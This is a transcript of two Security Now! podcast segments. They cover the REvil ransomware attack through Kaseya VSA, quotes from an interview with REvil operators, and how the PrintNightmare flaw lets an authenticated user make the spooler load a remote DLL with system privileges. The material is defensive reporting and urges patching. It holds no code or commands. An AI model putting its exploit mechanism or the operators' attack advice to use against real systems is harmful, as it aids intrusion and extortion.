LEO:  I presume it's going to self-install.  This is from Lawrence Abrams' BleepingComputer.  It's KB5004945, and KB5004946, 7, 9, and 50, depending on your Windows version.  I would imagine they'll push it.  But if you're worried, you might want to check it.  But KB5004945 through 4950.  So that's good news.  That's good news.



STEVE:  Yes, yes.  So I can confirm, as I just did, that the emergency out-of-cycle update is happening.



LEO:  Good, good.



STEVE:  The Win10 machine that I'm talking to you on, I went to Windows Update.  And sure enough, I'm seeing Cumulative Update for Windows 10 version - in this case it's 20H2, KB5004945.



LEO:  Good, yup.



STEVE:  And that's the one.  So all any of our listeners need to do is just you might have to give Windows Update a little kick, go check for updates.



LEO:  Be a seeker, yes.



STEVE:  And then it'll find it, and you'll be good to go.



LEO:  Don't be a sucker, be a seeker.



STEVE:  And boy, you know, this is a service, as we said, that's running in every version of Windows from time immemorial.  So, ugh.



LEO:  Need it or not.  



STEVE:  For better or for worse, yes.  And that's a good point, too.  I mean, since it has been a source of constant problems, and since we already know that there's going to be some more announced during Black Hat next month, seriously, if you don't need the print spooler, turn it off.



LEO:  Right.



STEVE:  You can still print, and you'll be shutting down untold numbers of vulnerabilities in the future.



LEO:  Yes.



STEVE:  Okay.  And I was just talking about NASes.  While we're on the subject of mass storage, in addition to this week's utterly amazing Picture of the Week, I can report having passed another milestone on the road to SpinRite 6.1.  At the end of my workday, day before yesterday, on Sunday, July 4th - I managed to put in eight hours, from 8:00 to 4:00 - I posted the news to GRC's spinrite.dev newsgroup that I had just finished the work on updating SpinRite's SATA/AHCI driver to add the features SpinRite would need to work properly with those controllers.



Up until that point the driver existed, and we were using it in the ReadSpeed Benchmark.  Works great.  But SpinRite needs for data recovery purposes all kinds of extra hooks into a driver.  So it now has those.  Last Friday I had finished the work on the similar thing, on SpinRite's PCI Bus Mastering driver.  So that means that now all five of SpinRite's new drive-access interface drivers are now written.



And recall that I designed a drive-independent IO abstraction layer to be driven by a new SpinRite core.  That core will finally switch SpinRite from its traditional track-based orientation to a linear storage model, which is what everything is today.  After today's podcast I will begin implementing SpinRite's new core.  It's already designed, and the IO abstraction was expressly designed for its use, so I expect the core implementation to go smoothly.  And once that's done, all of the parts of SpinRite that needed redesigning and rewriting will have been.  None of that new code I've been writing will have been tested and debugged yet.



So I'll set up test cases and work through the live code to watch it work and verify that in every case it does what I intend.  Once it all appears to be working, I'll turn the newsgroup gang loose on it for their testing.  And I'm certain we'll be discovering things that still require some tweaking.  But we'll kind of be tweaking things.  I mean, all of the heavy lifting is done.  And at that point we'll be working with on a fully functional pre-release of the finished and final SpinRite v6.1.  So things are starting to get exciting.



LEO:  Woohoo.



STEVE:  And speaking of exciting, Leo, last Friday evening, after I had finished that work on SpinRite's new PCI Bus Mastering Driver, Lorrie and I watched and thoroughly enjoyed Amazon's new release of "The Tomorrow War."



LEO:  Oh, good, yeah.



STEVE:  Starring Chris Pratt.



LEO:  Loved it, yeah.



STEVE:  Yes.  We did, too.  Afterward, of course, we had the inevitable discussion about the paradoxes arising whenever someone arranges to travel backward in time.  As we all know, traveling forward in time is no problem at all.  But moving into the past creates all sorts of dilemmas.  In any event, after the movie I tweeted to my Twitter followers.  My tweet read:  "Buckle up.  If you have access to Amazon Prime and enjoy sci-fi action movies, I can recommend Chris Pratt in 'The Tomorrow War' - nonstop action, fun, astonishing special effects.  How did they do those alien monsters?"



LEO:  Those were pretty - I was thinking the same thing.  Obviously CGI, but wow.



STEVE:  Oh, Leo.  Well, yeah.  And the actors are like, they're like interacting with nothing.



LEO:  Right.



STEVE:  I mean, it's like it was astonishing.



LEO:  Yeah.



STEVE:  Anyway, I wrote...



LEO:  Actors are getting really good at interacting with nothing, by the way.  That's the new skill, I think.



STEVE:  Yeah.  I think so.  And certainly Chris Pratt is because he has a lot of costars that couldn't possibly exist.



LEO:  Yeah.



STEVE:  Like Groot.  Anyway, I can't imagine, I said, that it would disappoint.  With very few exceptions, the replies from those who were motivated to watch the movie as a consequence of my tweet were similarly very positive.  In fact, Jason Hudson tweeted that he was immediately watching it a second time.  And I get that, because it was a romp.  There were a few "meh" replies.  But one Twitter follower, Houdini7, was the least impressed of all.  He wrote: "I found it so full of plot holes and trivial clichs, I felt it was one of the worst movies I've ever seen."



LEO:  Wow.



STEVE:  I know.  So I suppose that Houdini7 has been quite lucky, Leo, with his movie choices throughout his life.



LEO:  Because there are worse movies.



STEVE:  Because, oh, my lord, I have definitely seen a great many way worse movies.  Nevertheless, IMDB does peg it at a 6.7, which falls below my normal 7.0 threshold of worthiness.  So is it, as Houdini said, full of plot holes and trivial clichs?  Absolutely.  And yet we still found it to be wonderfully fun.  And I guess, you know, when it comes to these kinds of movies, I'm a proud 10 year old.  So for any other 10 year olds at heart, if you're in search of a deeply cerebral experience, you'll likely be as disappointed as Houdini7 was.



LEO:  No, it's an action flick.  You know.



STEVE:  Yes.  But if you're looking for a wonderful sci-fi romp, I believe that I can safely encourage you not to miss Amazon Prime's "The Tomorrow War."



LEO:  Nice.



STEVE:  And so apparently you and Lisa also...



LEO:  We enjoyed it, yeah, yeah.  It was fun.  It was very loud.



STEVE:  I thought it was a lot of - yeah.  Okay.  The Kaseya Saga.  Kaseya?  Yeah, that's how we'll pronounce it.



LEO:  Yes, Kaseya.



STEVE:  Kaseya.  Okay.  So before we plow into the saga, I wanted to share a little bit of interesting trivia.  I found a Q&A interview which first appeared on October 23rd of last year.  It was conducted between - they call themselves "Russian OSINT," Open Source Intelligence, between them and a member of the REvil gang.  The link to the entire dialogue is in the show notes, for anyone who's interested.  The interview was titled "Uncensored Interview with REvil / Sodinokibi Ransomware Operators," and most of what's there we already know.



But at one point the Russian OSINT interviewer asked:  "What does the R prefix in the word REvil mean?  Is that the word Reborn?"  The REvil interviewee replies:  "Ransom Evil.  The thought came from Resident Evil."  Now, I'd imagine that all gamers are familiar with Resident Evil, also known as Biohazard.  It's an older Japanese videogame series and media franchise which was created by Capcom, featuring plot lines and bio weapons and viral incidents.  And, yes, I also very much enjoyed the many spinoff Resident Evil movies, too - because, as I said, it's sometimes fun to be 10 years old.



But a few other interesting tidbits arose from their much longer interview.  And I've got a little - I've got, what, one, two, three, four, five, six back-and-forth Q&As.  Russian OSINT asked:  "Have you ever had problems when it was not possible to decrypt encrypted files after receiving a ransom?  That is, something went wrong, and you yourself could not do anything?"



The REvil guy said:  "Yes.  If you have previously tried to use third-party data recovery software.  If at least one bit of the file is modified, the key will be lost.  Especially often this happens with antivirus.  It simply deletes notes, and they contain keys."  He said:  "I say openly, such cases are extremely rare.  I remember only 12 for the entire time of work.  And of course we never took money.  The note contains a warning to the victims.  If they don't read it, their difficulties."



Russian OSINT:  "Which industries are currently the 'fattest' for ransomware attacks?  Where is the most profit?"  REvil replies:  "IT providers, insurance, legal firms, manufacturing - especially, oddly enough, the agro-industrial complex."



Russian OSINT:  "You don't do any hacking and fixing into the infrastructure with your own hands.  Your partners do it; right?"  And REvil said:  "We have our own flying squad, and we also have partners.  We do this and that."



And, finally, Russian OSINT asked:  "A recent report from Microsoft said that two extreme effective attacks for introducing ransomware are brute force and RDP hacking.  How, do you think, will attack vectors change over time?"  The REvil guy replied:  "Brute force has been alive for 20 years.  And he will be alive.  RDP is the best vector.  Especially the fresh BlueGate vulnerability will hit him very hard."  So the word from REvil.



Okay.  So what's the back story behind this biggest ever, record-breaking, single ransomware event?  Let's begin with who is Kaseya?  They're an international IT solutions provider based in Dublin, Ireland, with their U.S. headquarters located in Miami, Florida.  And they maintain a physical presence in 10 countries.  Among the IT solutions offered is something they call VSA.  It's a unified remote monitoring tool for managing networks and endpoints.  This VSA software is aimed at enterprises and managed service providers, and Kaseya says that over 40,000 organizations worldwide use at least one of their solutions.



Last week I was noting that MSPs are a very potent source of ransomware intrusion since, as we saw in that case of a managed service provider to dental offices, a single intrusion at an MSP could expand downward into all of that company's clients and customers.  Essentially, all of an MSP's clients have extended their networks into that common service provider.  And as we often like to rhetorically ask on this podcast, "What could possibly go wrong?"



What went wrong in this instance was that, just as MSPs serve many clients, many MSPs are using a single common VSA server provided by Kaseya, and that VSA software contained a number of zero-day vulnerabilities that were being leveraged by a clever and determined REvil affiliate.  On July 2nd, at 2:00 p.m. Eastern, Kaseya's CEO Fred Voccola announced what he called "a potential attack against the VSA that has been limited to a small number of on-premise customers."  Uh-huh.  That has turned out to be nearly 40 of Kaseya's MSP customers, each of whom had many clients.



Two days later, by the 4th of July, day before yesterday, Kaseya had revised its estimate of this attack in its severity, calling its software "the victim of a sophisticated cyberattack."  Apparently the truth is that Kaseya's CEO wishes that a sophisticated cyberattack was responsible.  But as we learn in a minute, it was apparently embarrassingly trivial.  FireEye's Mandiant team, in addition to several other security companies, were called in to help get a grip on the situation.  Kaseya posted that:  "Our security, support, R&D, communications, and customer teams continue to work around the clock in all geographies to resolve the issue and restore our customers to service."  In other words, they knew they had been the vector of a serious problem.



The FBI described the incident as a "supply chain ransomware attack leveraging a vulnerability in Kaseya VSA software against multiple MSPs and their customers."  Huntress has tracked 30 MSPs involved in the breach and believes with high confidence that the attack was triggered via an authentication bypass vulnerability in the Kaseya VSA web interface.  And in a Reddit explainer, Huntress further added that an estimated 1,000 companies - and Leo, you have newer news.  Now we're estimating that at 1,500.



LEO:  Yeah, yeah.  I'm sure that's not the end of it.  It's going to be more, yeah.



STEVE:  Yup, yup, have had servers and workstations encrypted and noted that it's reasonable to suggest thousands of small businesses may have been impacted.  Sophos has said that:  "This is one of the farthest reaching criminal ransomware attacks that Sophos has ever seen.  At this time, our evidence shows that more than 70 managed service providers were impacted, resulting in more than 350 further impacted organizations."  And I don't know further to what.  They said:  "We expect the full scope of victim organizations to be higher than what's being reported by any individual security company."  Because inherently this is, right, a distributed attack with distributed reports.



The REvil affiliate's discovery of vulnerabilities in Kaseya's VSA offering allowed them to cause malicious update payloads to be sent out to all of the devices being managed by each compromised Kaseya VSA server.  Using this malware delivery channel cleverly provided the REvil malware with cover in several ways by supplying the initial compromise through a trusted channel, and leveraging the trust in the VSA agent code.



And get a load of this.  Kaseya requires that its software agents running in their clients' systems be given antimalware exclusions for its application and its agents' working folders.  That means that, thanks to those exclusions, anything executed by the Kaseya Agent Monitor in its clients' machines is allowed to run and is ignored by any antiviral protections.  And once again, what could possibly be wrong with that strategy?  It was these explicit exclusions which Kaseya requires that allowed REvil to deploy its dropper without any scrutiny in these thousands of client systems worldwide.



For these reasons, Kaseya's VSA solution platform was a perfect foil for REvil.  Among other functionality of VSA is the deployment of software via these agents and automation of IT tasks.  As such, VSA agents and their actions obtain and run with a high level of trust on customer devices; right?  Trust what it does.  Turn off antivirus because we were getting some pesky false positives on our IT automation, and we don't want those.  We don't want pop-ups.  We just want, you know, VSA should be able to do whatever it wants.



By infiltrating the VSA server, any attached client will perform, without question, whatever task the VSA server requests.  Security analysts have suggested that this is probably one of the reasons why Kaseya was targeted in the first place.  In other words, the REvil affiliate who managed to infiltrate Kaseya almost certainly did it deliberately because they appreciated the size and power, the scope of the attack that they would be able to achieve.  In that sense, it's very much like the attack against the SolarWinds; right?  They realized, if they got into SolarWinds, they'd be able to push it out to all of SolarWinds' many customers via their update mechanisms.



LEO:  Nothing like a supply chain attack, man.



STEVE:  That's right, baby.



LEO:  Higher up in the food chain you're going to get more results, yeah.



STEVE:  Exactly.  So as we all know by this time, that clever REvil affiliate was correct.  In one headline-grabbing instance, the Swedish supermarket chain Coop was forced to shut down some 500 of its stores after those stores' retail checkout cash registers all stopped functioning en masse.  And now we learn that Kaseya was aware of the zero-day vulnerabilities in its systems at the time of these attacks.  I know.



LEO:  That's frustrating.



STEVE:  On Sunday, the Dutch Institute for Vulnerability Disclosure (DIVD) revealed that it had alerted Kaseya to a number of zero-day vulnerabilities in its VSA software, and that it said they were being exploited as a conduit to deploy ransomware.  DIVD indicated that Kaseya was in the process of testing fixes for VSA under coordinated vulnerability disclosure - and who knows how much time DIVD had given them - when the July 2nd attacks took place.



Although DIVD revealed no specifics about the flaws they had discovered, DIVD's chairman, Victor Gevers - and he's a young guy.  I watched an interview of him.  I couldn't understand what he was saying.  But he suggested that the zero-days were trivial to exploit.  And he tweeted, in English:  "If I would show you the PoC [the proof of concept], you would know how and why instantly."



The attacks, of course, caught these researchers and Kaseya by surprise, and probably in horror.  Since the immediate solution was to get all Internet-exposed VSA servers offline, DIVD has been providing a list of publicly accessible VSA IP clients, the IP addresses and customers' IDs to Kaseya to help that to happen.  This effort led to a dramatic decrease in publicly accessible servers, from a starting count of over 2,200 known online exploitable VSA servers to now only 140 which are known to still be accessible today.  Now, of course, those are not all MSPs.  I'm sure they had many end-user customers, as well.  But the MSPs were the big juicy ones because, again, supply chain.  They were the tip of a larger iceberg of exploitability.



And this brings us to the curious case of the ransom demands, which appear to be far more sophisticated than we've seen before.  The nature of the ransom offers and their negotiations, which appear to center around file extensions, networks, and wholesale attacks, has raised questions for me about the details of the Sodinokibi ransomware.  I was wondering what design architecture would allow them to pull off what they were offering to do in terms of ransom response granularity.  So I spent some time digging into it, and I was quite surprised by what I found.  As a consequence, next week's podcast is already titled "REvil's Clever Crypto," where I plan to lay out the amazingly sophisticated cryptographic design of this king of the ransomware hill.



Here's what we've learned.  We've learned that the files of the individual MSP victim clients, right, the ultimate end-users, were probably not exfiltrated before their encryption.  So there's that.  Probably just because there were too many of them.  And Emsisoft's CTO Fabian Wosar said that MSP customers who were affected by the attack received initial ransom demands of $44,999.  Now, I was wondering why we were seeing weird pricing of non-whole numbers, like remember, Leo, $1,000 shy of $22 million for the Irish health attack.  But then when I see 44,999, I'm thinking that it's imitating retail pricing.



LEO:  So it's not quite 50,000.



STEVE:  Yeah, we're not asking 45,000 here.



LEO:  It's a deal.



STEVE:  We're giving you a bit of a bump here.  We're only going to take $44,999.  It's a bargain.



LEO:  It's nonsense because nobody's making a buying decision.  I mean, that's nonsense.



STEVE:  Right.  Upon closer inspection, however, so it appears that the 44, well, we'll call it 45,000 for ease, ransom is "per file extension," and that REvil's Sodinokibi often encrypts files with many different extensions.  So I don't yet know what that's about.  Perhaps they're saying you can have all your DOC files decrypted for $45,000; but if you also want your SQL databases back, that'll be another 45,000, please, and so on.  It's not clear, however, whether the file extensions of the encrypted files are the same as their original non-encrypted extensions, their real extensions, or whether they may be something assigned by the malware.  There was something I read that led me to believe that it might be a way of offering to decrypt some specific files or a proportion of all files.  But as far as I know, this is the first instance we've seen of what you might call "itemized file decryption by extension."



Then, moving up a level, the REvil affiliate also apparently has the ability to decrypt by MSP customer because ransom demands of $5 million, and their payment, would reportedly allow them to decrypt all of the files regardless of file extension, yet presumably not those belonging to any other of an MSP's customers.  So you can see what I mean when I say that, if this is true, there's some fancy and cool hierarchical crypto happening here.



And there's yet another level.  The REvil gang posted the following message to their wonderfully named "Happy Blog."  The title of the blog posting is "Kaseya," and they've got it spelled right, "Kaseya Attack Info."  They wrote:  "On Friday, 2.07.2021, we launched an attack on MSP providers."  Now, they said, "More than a million systems were infected."  Okay, no.  No one thinks it's that many.  But fine.  "If anyone wants to negotiate about universal decryptor, our price is $70 million in bitcoin," yeah, U.S. dollars in equivalent bitcoin.



LEO:  That's retirement money.



STEVE:  That's right.  "And we will publish publicly decryptor that decrypts files of all victims so everyone will be able to recover from attack in less than an hour.  If you are interested in such deal, contact us using victims' 'readme' file instructions."



LEO:  Such a deal.



STEVE:  Wow.  70 million, and everybody gets decrypted.  But what this means is that it's possible for the entire encompassing multi-MSP Mary Kay pyramid distribution model of malware to, like, work for everybody, but then also to have a per-victim and a per-file extension decryption for varying levels of payment.  So a very interesting system.  And I look forward to digging into it further and providing our listeners with a deep dive into the technology of REvil next week.



So one thing should become very clear.  Given the nature of this attack, very little of our networked software has been put under the sort of scrutiny and attack that it is being and will be subjected to in the future.  And unfortunately, this is the shape of that future.



LEO:  Well, well, well.  What do you think the number will be eventually?



STEVE:  How about maybe twice what we've seen, so 3,000 clients?



LEO:  The 1,500, I was just looking, comes from Kaseya's own CEO.  So, yeah.



STEVE:  Okay.  So, yeah.  And also, so that would be 3,000 companies, each of whom has probably had lateral movement within their network.



LEO:  Right.



STEVE:  So that could be 50 machines in a company.



LEO:  Right.



STEVE:  So we could see that multiplied up.  I mean, it's a mess.



LEO:  Well, and we've been talking about supply chain since way back when, when that Supermicro story came out from Bloomberg.



STEVE:  Right.



LEO:  About potentially this modification of the Supermicro motherboards.  It was undetectable.  And the conclusion of that is whether or not that happened, that supply chain attacks are going to be the wave of the future.  And they're almost impossible to stop.  And they're leveraged; right?



STEVE:  Yup.  



LEO:  Because you get Kaseya, you get everybody who uses Kaseya.  So, boy, you're right, I don't think this is the end of that.  This is just the beginning, yeah.  And nobody's, you know, I mean, what do we do?  You start over?  You can't throw everything out.  What are you going to do?



STEVE:  Yeah.



LEO:  Steve Gibson, as always, thumbs up, aces.  We do this show every Tuesday, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  If you want to watch us do it live, TWiT.tv/live.  There's live audio and video there, and you can also chat with us live at irc.twit.tv.  Steve keeps copies of the show at his website, GRC.com.  Besides the normal 64Kb audio, there's 16Kb audio for people with limited bandwidth, or bandwidth caps they don't want to exceed.



There's also, and Steve commissions this, so he should get all the credit for it, a very nice transcript of the show, which aids in two ways.  One, a lot of people like to read while they listen.  It helps with the comprehension.  But, two, you can search it and find the shows you're looking for much more easily.  Thanks to Elaine Farris for doing that.  GRC.com.  While you're there, it's getting close, time to pick up SpinRite 6, 6.1 on its way, getting close.



STEVE:  Yup.



LEO:  I can feel it.  And if you buy 6.0 now, you get a free upgrade to 6.1.  All of that at GRC.com, along with other free stuff.



STEVE:  I'm dreaming about code now.  



LEO:  Yeah, that's a sign you're doing it a lot; right?  It's in your head.



STEVE:  It's like, it's in my head, yeah.



LEO:  You know, it's funny.  Every year I attempt and fail a coding challenge called the Advent of Code, which is really fun, but I've never completed the whole thing.  But the problems are such that often I just go to - I say, okay, I got it, I'm going to bed, hoping, and sometimes it actually works, I'll wake up with, oh, the insight.  You really do work in your sleep on stuff like this.  And if you've got kind of a debugging challenge, or just some coding challenge...



STEVE:  Well, and that's where the famous expression "sleep on it" comes from; right?



LEO:  It works.  Yeah, it really works.  Let's see.  We have of course the show at our website also, TWiT.tv/sn.  There's video there, as well, if you want to watch us.  It's kind of boring, but you can.  There's also links to the YouTube channel because there's a Security Now! YouTube channel, to the downloads, and all the podcast players you can use to get it automatically.  In fact, if you do use a podcast player, and they offer reviews, please leave Steve a five-star review.  Really we want the world to know this resource exists for everybody, for free.



Let's see.  I think that concludes this session.  I hope you all are enlightened and will go and run down your print spooler update.  Thank you, Steve.  Have a great week.  See you next week on Security Now!.



STEVE:  Ciao, buddy.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#827

DATE:		July 13, 2021

TITLE:		REvil's Clever Crypto

HOSTS:	Steve Gibson & Mikah Sargent

SOURCE:	https://media.grc.com/sn/sn-827.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  The past week has been dominated by the unimaginable mess that Microsoft has created with what have become multiple failed attempts to patch the two PrintNightmare flaws, and the continuing "Cleanup on Aisle 5" following what is widely regarded as the single most significant ransomware supply chain attack event ever.  So today we first catch up on the still sadly relevant PrintNightmare from which the industry has been unable to awaken.  We'll cover a few more bits of security news.  Then, as planned, we'll take a deep dive into the detailed operation of the REvil/Sodinokibi malware's cryptographic design.



SHOW TEASE:  Coming up on Security Now!, I am in for Leo Laporte this week to talk to Steve Gibson about Security [Right] Now! because that's how it works.  First, we talk about Microsoft's ongoing PrintNightmare.  Yes, it continues to be a nightmare; and disabling the print spooler, well, that just ruins everything.  There's a lot to talk about, what you can do to fix it, and why it's still broken.  Plus we talk about how Kaseya could have actually been a lot worse than it actually was - REvil's ransomware campaign didn't do the full and complete damage it could have done - before we round things out with an in-depth look at the entire encryption method from REvil.  It's quite a doozy, but Steve Gibson does his best to explain while I stare at a flowchart that makes zero sense to me.  It's all coming up on Security Now!.



MIKAH SARGENT:  This is Security Now!, Episode 827, recorded Tuesday, July 13th, 2021:  REvil's Clever Crypto.



Hello, and welcome to Security Now!.  Look, when I'm here to cohost a show I tend to like to use the description page that we have with TWiT.  And so I'm going to tell you about the man who coined the term "spyware" and created the first antispyware program.  It's Steve Gibson of, well, Security Now! fame, and I am honored to be joined by you today, Steve.



STEVE GIBSON:  Hey, it's great to be with you, standing in for Leo as you are, while he and his gang are surfing somewhere, I guess.



MIKAH:  Yes, yeah, gallivanting in...  	



STEVE:  Catching some rays.



MIKAH:  Somebody's got to do it.



STEVE:  So we have, surprisingly, happily, the topic that I teased and promised last week, since really nothing happened other than the two big stories that we'll be covering this week, which is the unimaginable mess that Microsoft has created with what have now become multiple failed attempts to patch the two PrintNightmare flaws.  And then, of course, this continuing cleanup on aisle five following what is widely acknowledged as the single most significant ransomware supply chain event ever.  So we're going to catch up on Print Nightmare and those problems; talk about a few other things that did happen.



And then, as I promised last week, we're going to talk about in detail - and yeah, some of our listeners will glaze over a little bit probably with some of the detailed crypto, but the fun is in the details - we're going to talk about REvil's Clever Crypto architecture and the flexibility that it provides.  So I think another great podcast for our listeners while Leo is getting a tan.



MIKAH:  Yeah, it sounds like it.



STEVE:  So we always have, as you know, a Picture of the Week.  It's been, I think, we sort of started this thing a decade ago, and it's always fun.  And as a consequence, I'm getting pictures send to me from Twitter followers pretty much on a constant basis.  I got a kick out of this one because it probably represents a lot of the way we feel.  It's a five-frame cartoon.  In the first frame we have a website with a talk bubble saying, "Welcome to my website.  Here are some ads."  And the viewer responds, "I won't see them because I have Ad Blocker."  Whereupon the website says, "Well, you have to turn off Ad Blocker in order to continue."  And the visitor says, "Goodbye," leaving the website sort of there holding its clipboard, thinking, huh, that didn't quite go the way we hoped.



And the point of course is that, given a choice, people may well just say, you know, if I have to lower my defenses, I mean, we've seen lots of instances where you have malvertising, as it's called, where an ad is actually malicious and can do some damage.  So there's an argument to be made for blocking ads, not only speeds up the page, makes it look a lot better, but it even increases its safety.  And I've often talked to Leo about how I also run with an ad blocker.  I just, you know, it makes for a much better web experience.



MIKAH:  Right.



STEVE:  And sometimes I'm using somebody else's machine, and almost I just sort of assume it's going to be mine, or like mine.  And then all this stuff starts jumping around and flashing at me, and I think, what has gone wrong?  And then I go, oh, this is what the typical web surfer experience looks like.  Probably 99.9% of people don't bother with an ad blocker because it's not built in.  And so that's what they get.



Anyway, okay, so I don't think that, as you and I were actually talking about before we hit the record button, that last week's podcast was over before I began receiving helpful tweets from our listeners letting me know that it was no longer true that the Windows Print Spooler service could be stopped, and that applications would then be able to print directly to a system's printers, rather than running through the spoolers.  Tweeters were informing me that wasn't true.  And they were 100% correct.  I dug into this a bit because I'm completely sure, as Leo was when he joined me in this belief last week, that there was a time when you could disable the print spooler, and everything would still work.



It turns out that printer dialogs even still, in their configuration, they have a setting for "Print directly to printer," rather than going through the print spooler.  So I tried changing that, and it didn't help.  Even on my Windows 7 machine, if the print spooler is not running, game over.  Doesn't matter how you configure your printer properties.  No.



Okay.  So for any machines relative to this PrintNightmare problem that may actually need to be able to print something, disabling what has continued to be a vulnerable print spooler service will not be a useful workaround because you need it to print.  One thing I guess you could do is if you were really concerned about this, is just run with it disabled, or run with it stopped because that's as good as, although that means it'll restart when you reboot your machine, but normally have it stopped.  Start it when you need to print.



MIKAH:  Oh, wow.



STEVE:  And stop it again, although that's a bit of a pain.  However, as we're going to see, that actually may be, depending upon your situation, the only solution.



Okay.  So as we know and described last week, two different problems have been discovered in the print spooler.  There's a remote code execution problem and a local privilege escalation problem.  What Microsoft fixed a month ago - and here we are, by the way, on Patch Tuesday for Windows, the second Tuesday of July.  It's not clear yet what we're going to be getting.  We typically talk about the next week, since often there's some consequences to people who install the updates on Windows, like things stop working that used to.  Oddly enough, printing often stops working.



But in any event, what they fixed a month ago with last month's Patch Tuesday was only one of the two.  They fixed the local privilege escalation problem.  And as we talked about then, they actually didn't do the fix correctly.  They stopped the problem as it was submitted in a proof of concept by a well-meaning security researcher.  They stopped it from having the problem, but apparently they didn't look around and realize that it was a symptom of a bigger problem which they did not address.  So that was the first fumble a month ago.  On the other hand, it's good that they did what little they did because escalation, as we know, of local privilege still is an extremely valuable capability for malware to obtain.  So anything that can be done to scale that back is good, although not actually fixing the problem is not good.



Obtaining execution of attacker-provided code on any modern OS is also a big problem.  But still, any serious exploitation of the machine often requires, even if an attacker can get their own code running, it requires more system privileges than the typical user is now running with on a daily basis.  And that's why in Windows we have the UAE, right, the User Account Controller (UAC) and where the screen darkens, and you have to say yes, I'm authorizing you to do something that requires additional privileges.  So with this split token design of Windows, you're able to, you know, they've sort of tried to keep people running with minimal privileges while not inconveniencing people who occasionally need to install a program, for example.



Anyway, the bad news is what Microsoft did failed to resolve the other trouble, which was the remote code execution vulnerability.  They did something toward limiting privileges, but not keeping random code from being provided remotely and running.



So as we also explained last week, it turns out that over the years, while Windows was quietly requiring the print spooler service to always be running, it was also adding some fancy new on-the-fly printer driver installation options, and therein lies the problem.  And it's actually a problem that Microsoft is now saying, uh, we're not going to be fixing that.  But we'll get to that in a second.  In a big networked office environment, what happens if your local Windows client, the machine that you're perched in front of, doesn't currently contain a driver for some printer in another on-campus building, for example, to which you've been told to send something.



So wouldn't it be slick, apparently thought Microsoft, if Windows could see that it's missing a needed driver for that printer, go find it somewhere, typically from the printer server that it's trying to access, have it installed like autonomously into your local machine for you to then print through that now-present driver to a remote printer that needs you to have that driver in order for you to print to it, and have this all happen in the background.  In this case, in answer to our often-posted rhetorical question, "What could possibly go wrong?," we learn that bad guys have figured out how to trick Windows into downloading their malware by disguising it as a printer driver and saying to Windows the equivalent of, oh, no, we need this printer driver now.



Microsoft describes this capability which was added, like way back in Windows 2000, as Point and Print.  And so in their description of Point and Print, they say:  "Point and Print is a term that refers to the capability of allowing a user on a Windows 2000 and later client" - still here today with us - "to create a connection to a remote printer without providing disks or other installation media."  Of course this sounds like this was written back in Windows 2000 when anyone actually had disks or installation media.  Like, oh, it's in the box.  Oh, I have a box?



So anyway, they said:  "All necessary files and configuration information are automatically downloaded from the print server to the client."  Isn't that handy.  They said:  "Point and Print technology provides two methods by which you can specify files that should be sent from the printer server to the client machine.  Files can be associated with a printer driver.  These files are associated with every print queue that uses the driver.  Or files can be associated with individual print queues."  And then they go on.  "For more information, see Supporting Point and Print During Printer Installations documentation," and so forth.



Okay.  So it's not the Point and Print service that's directly being exploited with malicious intent, but rather the operating system's supported underpinnings, that is to say, the API calls which Microsoft created in order to build this Point and Print service.  So the CERT Coordination Center's vulnerability note, which was VU#383432, is titled:  "Microsoft Windows Print Spooler allows for RCE" - as we know, that's remote code execution - "via," and then they have the name of the API, "AddPrinterDriverEx," E-X.



Okay.  And just for our listeners who don't know, Microsoft does this all the time.  The Ex is short for "extended" because there is also an AddPrinterDriver.  But after a few years, they realized, oh, we need to add some more bells and whistles to this thing.  It doesn't do everything we need. So they extend the API, which adds a bunch more parameters typically, and so you always have the original one, and then you have the extended one.  So anything ending with Ex is like Rev. 2 or v2.0 of this particular API call.



MIKAH:  Does the Ex just become the junk drawer from that point on?  Does anything new go into it?



STEVE:  Well, the good news is we've never seen ExEx.  That would be bad.



MIKAH:  Okay, yeah, that was my question.



STEVE:  Typically they say, okay, we're not doing that.  We'll come up with a different name.



MIKAH:  Oh, gotcha.



STEVE:  Instead of the extended API.  So the CERT Coordination Center is explaining, they said:  "The Microsoft Windows Print Spooler service fails to restrict access" - okay, I love this, because they're not Microsoft.  Microsoft pussyfoots around this.  CERT says:  "The Microsoft Windows Print Spooler service fails to restrict access to functionality that allows users to add printers and related drivers, which can allow a remote authenticated attacker" - but that doesn't mean like authenticated with high privilege.  "Authentication" just means, okay, yeah, we see you - "attacker to execute arbitrary code with system privileges on a vulnerable system."



And now remember the term "vulnerable system" because Microsoft themselves are going to be using that in a minute here.



MIKAH:  Good.  I'm wondering what that means in this case.  Is it every system?



STEVE:  Yeah.



MIKAH:  Yeah, okay, good that we're figuring that out.



STEVE:  So they said:  "The RpcAddPrinterDriverEx function" - the enhanced one - "is used to install a printer driver on a system.  One of the parameters to this function is the DRIVER_CONTAINER object, which contains information about which driver is to be used by the added printer.  The other argument, which is dwFileCopyFlags, specifies how replacement printer driver files are to be copied."  And actually, because I was curious when I was digging around in this, that's the additional parameter that was added in the Ex version of the API.  They thought, oh, we should, in order to do this on-the-fly installation of drivers, we need to somehow specify whether to copy, to replace, what to do as part of this.  So this dwFileCopyFlags is what is present in the Ex version of the API.



Anyway, they said:  "An attacker can take advantage of the fact that any authenticated user can call" - again, any authenticated user - "can call RpcAddPrinterDriverEx and specify a driver file that lives on a remote server."  And that's, by the way, any remote server, like one in Russia.  "This results in the Print Spooler service, spoolsv.exe, executing code in an arbitrary DLL file with system privileges."



MIKAH:  Oh, my god.



STEVE:  What could possibly go wrong?  Oh.  So they said:  "Note that while original exploit code relied on the RpcAddPrinterDriverEx to achieve code execution, an updated version of the exploit uses RpcAsyncAddPrinterDriver to achieve the same goal.  Both of these functions achieve their functionality using AddPrinterDriverEx."  Then they finish: "While Microsoft has released an update for CVE-2021-1675" - that was the fix in last month's Patch Tuesday.  They say:  "It is important to realize that this update does NOT" - all caps, their emphasis - "protect against public exploits that may refer to PrintNightmare or CVE-2021-1675."  In other words, they didn't actually fix the problem that they said they were fixing in 1675.



